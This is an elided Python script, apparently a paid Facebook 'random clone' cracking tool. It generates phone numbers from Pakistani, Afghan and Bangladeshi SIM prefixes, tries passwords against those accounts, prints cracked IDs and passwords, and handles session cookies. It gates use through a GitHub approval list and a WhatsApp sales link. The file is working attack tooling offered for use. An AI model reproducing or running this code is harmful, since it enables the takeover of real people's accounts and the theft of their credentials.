...
def uaku():
	try:
		...
		a=requests.get('https://github.com/FOX-AR/Approval.txt').text
		ua=open('.bbnew.txt','w')
...
logo ="""\033[1;35m▄▄▄█████▓  ██████ ▒███████▒
 ...
 \033[1;32m║[•] NETWORK :\0331[1;32m 2G ,3G ,5G WIFI,,
 \033[1;32m║[•] VERSION :\034[1;32m V.1.0.6
 \033[1;32m╚════════════════════════════════════════╝

\033[1;96m♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒        
\033[1;91m:》》》\033[1;93m+8801972239643\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m==============================================================="""
os.system("clear")
print(logo)
def sex():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+8801972239643?text=*Hello*%2C%20*MR.ANTO*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*Random*%20*clone*')
      time.sleep(3) 
      sys.exit() 
  except: 
    sys.exit() 
...
def main():
    ...
    print('[2]\033[1;37m START PUBLIC CRACK_COMING')
    print(49*'=')
...
def random_number():
    ...
    print(logo)
    print('\033[1;35m[+]==============================================')
    print('\033[1;35m[√] PAKISTAN SIM CODE : 😈')
    print('\033[1;35m[~] \033[1;32m[92301],[92300],[92315],[92318],[92345] ETC\033[0;35m')
    print('\033[1;32m[+]==============================================')
    print('\033[1;35m[√] APGHAN SIM CODE : 🖐')
    print('\033[1;35m[~] \033[1;32m[9370],[9371],[9372],[9377] ETC...\033[0;35m')
    print('\033[1;32m[+]==============================================')
    print('\033[1;35m[√] BANGLA SIM CODE : 😍')   
    print('\033[1;35m[~] \033[1;32m[+880130],[+880140],[+880172],[+880199]ETC...\033[0;35m')
    print(49*'=')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;34m[ANTO-OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m[ANTO-CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
